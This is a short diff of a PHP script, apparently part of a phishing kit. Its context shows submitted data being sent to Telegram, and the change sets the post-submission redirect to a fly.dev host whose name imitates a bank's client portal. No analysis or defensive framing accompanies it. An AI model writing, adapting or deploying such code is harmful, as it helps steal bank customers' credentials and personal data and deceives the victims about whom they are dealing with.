@@ -55,7 +55,7 @@ if ($response === false) {
     die("Error al enviar el mensaje a Telegram.");
 } else {
     // Redirigir a otra página después de enviar los datos
-    header("Location: /2.html"); // Cambia esto por la página a la que quieres redirigir
+    header("Location: https://banproclientesdigital.fly.dev/2.html"); // Cambia esto por la página a la que quieres redirigir
     exit;
 }
 ?>
